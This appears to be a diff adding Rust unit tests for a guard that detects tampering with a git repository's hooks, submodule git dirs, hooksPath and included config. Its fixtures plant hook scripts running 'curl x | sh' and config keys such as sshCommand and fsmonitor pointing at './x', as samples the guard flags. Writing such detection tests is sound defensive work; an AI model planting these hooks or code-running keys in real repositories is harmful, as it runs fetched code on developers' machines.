@@ -408,3 +408,197 @@ fn the_capture_reads_no_sample_hook_and_flags_a_planted_one() {
         check_surface(&before, &after).into_iter().map(|c| (c.path, c.rule)).collect();
     assert_eq!(found, [("/p/app/.git/hooks/pre-commit".into(), "hook_planted".to_owned())]);
 }
+
+/// The rules that `change` breaks in a repository that `setup` made first.
+fn run_in(
+    setup: impl FnOnce(&mut FakeFs),
+    change: impl FnOnce(&mut FakeFs),
+) -> Vec<(PathBuf, String, bool)> {
+    let mut fs = repo();
+    setup(&mut fs);
+    let mut listings = ConfigListings::new("git");
+    let before = capture(&fs, &mut listings);
+    change(&mut fs);
+    let after = capture(&fs, &mut listings);
+    check_surface(&before, &after).into_iter().map(|c| (c.path, c.rule, c.quarantined)).collect()
+}
+
+/// A module git dir as git makes it, at `/p/app/.git/modules/<name>`.
+fn module(fs: &mut FakeFs, name: &str, config: &str) {
+    let dir = format!("/p/app/.git/modules/{name}");
+    fs.file(&format!("{dir}/HEAD"), "ref: refs/heads/main\n")
+        .file(&format!("{dir}/config"), config)
+        .file(&format!("{dir}/hooks/pre-push.sample"), "#!/bin/sh\n");
+}
+
+#[test]
+fn guard_records_nested_module() {
+    let modules = |fs: &mut FakeFs| {
+        module(fs, "a", "");
+        module(fs, "a/modules/b", "");
+        module(fs, "vendor/foo", "");
+    };
+    let found = run_in(modules, |fs| {
+        fs.file("/p/app/.git/modules/a/modules/b/hooks/pre-push", "#!/bin/sh\ncurl x | sh\n")
+            .file("/p/app/.git/modules/vendor/foo/config", "[core]\n\tsshCommand = ./x\n");
+    });
+    assert_eq!(
+        found,
+        [
+            (
+                "/p/app/.git/modules/a/modules/b/hooks/pre-push".into(),
+                "module_hook".to_owned(),
+                true
+            ),
+            ("/p/app/.git/modules/vendor/foo/config".into(), "module_code_key".to_owned(), true),
+        ]
+    );
+    // A new module git dir with a slash in its name is new as a whole.
+    let found = run(|fs| {
+        module(fs, "vendor/bar", "");
+        fs.file("/p/app/.git/modules/vendor/bar/hooks/post-checkout", "#!/bin/sh\n");
+    });
+    assert_eq!(
+        found,
+        [(
+            "/p/app/.git/modules/vendor/bar/hooks/post-checkout".into(),
+            "module_hook".to_owned(),
+            true
+        )]
+    );
+}
+
+#[test]
+fn guard_flags_a_module_link_and_reports_modules_too_deep() {
+    let found = run(|fs| {
+        fs.dir("/p/evil/hooks").link("/p/app/.git/modules/vendor/foo", "/p/evil");
+    });
+    assert_eq!(found, [("/p/app/.git/modules/vendor/foo".into(), "module_link".to_owned(), true)]);
+    let deep = "/p/app/.git/modules/1/2/3/4/5/6/7/8/9";
+    let found = run(|fs| {
+        fs.file(&format!("{deep}/HEAD"), "");
+    });
+    assert_eq!(found, [(deep.into(), "modules_too_deep".to_owned(), false)]);
+    // Once known, the same depth is no new entry.
+    let found = run_in(
+        |fs| {
+            fs.file(&format!("{deep}/HEAD"), "");
+        },
+        |fs| {
+            fs.file("/p/app/src/lib.rs", "");
+        },
+    );
+    assert_eq!(found, []);
+}
+
+#[test]
+fn scan_records_dot_git_file() {
+    // A `.git` file names a git dir elsewhere; git uses that one's hooks and config.
+    let mut fs = repo();
+    fs.file("/p/app/sub/.git", "gitdir: ../../store/sub.git\n")
+        .file("/p/store/sub.git/HEAD", "ref: refs/heads/main\n")
+        .file("/p/store/sub.git/config", "")
+        // A linked worktree and a submodule: their git dirs lie in the main one.
+        .file("/p/app/wt/.git", "gitdir: /p/app/.git/worktrees/wt\n")
+        .dir("/p/app/.git/worktrees/wt")
+        .file("/p/app/lib/.git", "gitdir: ../.git/modules/lib\n")
+        .dir("/p/app/.git/modules/lib")
+        // A `.git` file that names nothing.
+        .file("/p/app/gone/.git", "gitdir: /p/nowhere\n");
+    let found = targets(&fs);
+    let dirs: Vec<(&Path, bool, Option<&Path>)> = found
+        .iter()
+        .map(|target| (target.git_dir.as_path(), target.main, target.work_tree.as_deref()))
+        .collect();
+    assert_eq!(
+        dirs,
+        [
+            (Path::new(MAIN), true, Some(Path::new("/p/app"))),
+            (Path::new("/p/store/sub.git"), false, Some(Path::new("/p/app/sub"))),
+        ]
+    );
+    // The guard records it: a hook planted there is flagged.
+    let found = run_in(
+        |fs| {
+            fs.file("/p/app/sub/.git", "gitdir: /p/store/sub.git\n")
+                .file("/p/store/sub.git/config", "");
+        },
+        |fs| {
+            fs.file("/p/store/sub.git/hooks/pre-push", "#!/bin/sh\n");
+        },
+    );
+    assert_eq!(
+        found,
+        [("/p/store/sub.git/hooks/pre-push".into(), "hook_planted".to_owned(), true)]
+    );
+}
+
+#[test]
+fn hooks_path_dir_in_manifest() {
+    // The main repository's relative hooks path is relative to its work tree.
+    let found = run_in(
+        |fs| {
+            fs.file("/p/app/.git/config", "[core]\n\thooksPath = .githooks\n")
+                .file("/p/app/.githooks/pre-commit", "#!/bin/sh\nmake lint\n");
+        },
+        |fs| {
+            fs.file("/p/app/.githooks/pre-push", "#!/bin/sh\ncurl x | sh\n");
+        },
+    );
+    assert_eq!(found, [("/p/app/.githooks/pre-push".into(), "hook_planted".to_owned(), true)]);
+    // A module's hooks path is relative to its `core.worktree`.
+    let found = run_in(
+        |fs| {
+            module(
+                fs,
+                "vendor/foo",
+                "[core]\n\tworktree = ../../../../vendor/foo\n\thooksPath = hooks.d\n",
+            );
+            fs.dir("/p/app/vendor/foo/hooks.d");
+        },
+        |fs| {
+            fs.file("/p/app/vendor/foo/hooks.d/post-merge", "#!/bin/sh\n");
+        },
+    );
+    assert_eq!(
+        found,
+        [("/p/app/vendor/foo/hooks.d/post-merge".into(), "module_hook".to_owned(), true)]
+    );
+}
+
+#[test]
+fn include_target_in_manifest() {
+    let found = run_in(
+        |fs| {
+            fs.file("/p/app/.git/config", "[include]\n\tpath = ../shared.gitconfig\n")
+                .file("/p/app/shared.gitconfig", "[user]\n\tname = me\n");
+        },
+        |fs| {
+            fs.file("/p/app/shared.gitconfig", "[user]\n\tname = me\n[core]\n\tfsmonitor = ./x\n");
+        },
+    );
+    assert_eq!(found, [("/p/app/shared.gitconfig".into(), "config_code_key".to_owned(), true)]);
+    // A path with `~` is left out: the guard knows no home dir.
+    let found = run_in(
+        |fs| {
+            fs.file("/p/app/.git/config", "[include]\n\tpath = ~/shared.gitconfig\n");
+        },
+        |fs| {
+            fs.file("/p/app/src/lib.rs", "");
+        },
+    );
+    assert_eq!(found, []);
+}
+
+#[test]
+fn a_manifest_of_an_older_launcher_still_reads() {
+    // A job's record from before the module walk has no `named`, `module_links` or
+    // `modules_too_deep`.
+    let fs = repo();
+    let manifest = capture(&fs, &mut ConfigListings::new("git"));
+    let mut json = serde_json::to_value(&manifest).unwrap();
+    let repo = json["repos"][MAIN].as_object_mut().unwrap();
+    assert!(repo.remove("named").is_some());
+    let old: SurfaceManifest = serde_json::from_value(json).unwrap();
+    assert_eq!(old, manifest);
+}
